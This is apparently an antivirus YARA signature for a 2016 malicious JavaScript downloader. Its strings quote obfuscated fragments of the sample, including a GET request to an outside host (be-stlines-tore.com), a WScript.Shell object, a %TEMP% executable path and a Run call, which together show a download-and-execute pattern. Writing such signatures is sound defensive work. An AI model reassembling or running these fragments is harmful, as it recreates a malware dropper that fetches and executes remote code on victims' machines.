rule sig_20160330_7eacd1a2663b82d7ee96ab078135a4e8 {
  meta:
    description = "datamaliciousorder - file 20160330_7eacd1a2663b82d7ee96ab078135a4e8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "69b040baafdda8d9d029bbb621ab1a23c95160f3d1dcd49e913a550ada6b502e"

  strings:
    $s1  = "E0[S](\"GET\", \"http://be-stlines-tore.com/k3soa\", false);" fullword ascii
    $s2  = "function X(Q, DR){H = H * 1; return Q - DR;};" fullword ascii
    $s3  = "var A0 = function O() {return WScript[HR](\"WScript\"+\".Shell\");}(), D = 11;" fullword ascii
    $s4  = "if (E0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SF() {return A0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"85l3bZ9dTJmb.ex\" + \"e\";};" fullword ascii
    $s6  = "function A(){return XN + \"\";};" fullword ascii
    $s7  = "function EG(UU){A0[\"Run\"](UU, H, H);};" fullword ascii
    $s8  = "function V() {return ((NW == true) && (NW == KI)) ? 1 : H;};" fullword ascii
    $s9  = "var SG = new this[\"Date\"]();" fullword ascii
    $s10 = "function R(SW) {var HB = (1, 2, 3, 4, 5, SW); return HB;};" fullword ascii
    $s11 = "return X(FY, JW);" fullword ascii
    $s12 = "function MA(){return HR;};" fullword ascii
    $s13 = "}while (EY);" fullword ascii
    $s14 = "function SS(){return 22;};" fullword ascii
    $s15 = "function YF()" fullword ascii
    $s16 = "var G = false;" fullword ascii
    $s17 = "var NW = false;" fullword ascii
    $s18 = "NW = true; " fullword ascii
    $s19 = "var KI = false;" fullword ascii
    $s20 = "KI = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}